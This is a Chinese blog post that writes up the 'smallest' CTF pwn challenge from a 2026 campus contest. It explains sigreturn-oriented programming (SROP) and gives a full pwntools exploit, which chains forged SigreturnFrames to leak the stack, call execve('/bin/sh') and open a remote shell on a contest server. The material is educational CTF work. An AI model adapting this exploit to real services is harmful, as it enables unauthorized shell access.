+++
title = "wp4--srop盲注"
date = "2026-04-14"
type = "post"
categories = ["比赛"]
tags = ["2026校赛"]
draft = false
+++
原题 360chunqiu2017_smallest
360chunqiu2017_smallest
首先是明显的栈溢出，而且是直接写到retaddr里的，因为没有libc，没有gadget可
以用，所以用write系统调用泄露栈地址
srop实际上是内核向进程发送signal信号后，程序陷入内核态，此时进程上下文被
保存到了用户态的栈空间，并在内核态恢复至用户态时将栈上的寄存器值恢复，如
果这个过程中可以伪造栈上的寄存器值，就可以控制恢复时的寄存器值，而不依赖
pop rdi一类的gadget，从而实现任意系统调用
数据发送过快会有bug，sleep就完了
学有余力可以查阅文章SROP - CTF Wiki和360chunqiu2017_smallest —— 从例
题理解SROP自己研究学习，这里给个exp：
```python
from pwn import *
from LibcSearcher import *
from pwnlib.util.iters import mbruteforce
from hashlib import sha256
import base64
context(log_level='debug',terminal = ["tmux", "splitw", "-h"],arch
= 'amd64',os = 'linux')
def proof_of_work(sh):
	sh.recvuntil(" == ")
	cipher = sh.recvline().strip().decode("utf8")
	proof = mbruteforce(lambda x: sha256((x).encode()).hexdigest()
== cipher, string.ascii_letters + string.digits, length=4,
method='fixed')
	sh.sendlineafter("input your ????>", proof)
start=0x4000B0
syscall_ret=0x4000BE
# io=process('./pwn')
io=remote("nc1.ctfplus.cn",14059)
pd=p64(start)*3
io.send(pd)
sleep(1)
io.send(b'\xb3')
sleep(1)
io.recv(8)
stack=u64(io.recv(8))
log.success('stack:'+hex(stack))
sig=SigreturnFrame()
sig.rax = constants.SYS_read
sig.rdi = 0
sig.rsi = stack
sig.rdx = 0x400
sig.rsp = stack
sig.rip = syscall_ret
pd=p64(start)+b'a'*8+bytes(sig)
io.send(pd)
sleep(1)
pd=p64(syscall_ret)+b'a'*7
io.send(pd)
sleep(1)
sig=SigreturnFrame()
sig.rax = constants.SYS_execve
sig.rdi = stack+0x120
sig.rsi = 0
sig.rdx = 0
sig.rsp = stack
sig.rip = syscall_ret
pd=p64(start)+b'b'*8+bytes(sig)
l=len(pd)
pd+=(0x120-l)*b'\x00'+b'/bin/sh\x00'
sleep(2)
io.send(pd)
sleep(2)
pd=p64(syscall_ret)+b'b'*7
io.send(pd)
sleep(2)
io.interactive()
```
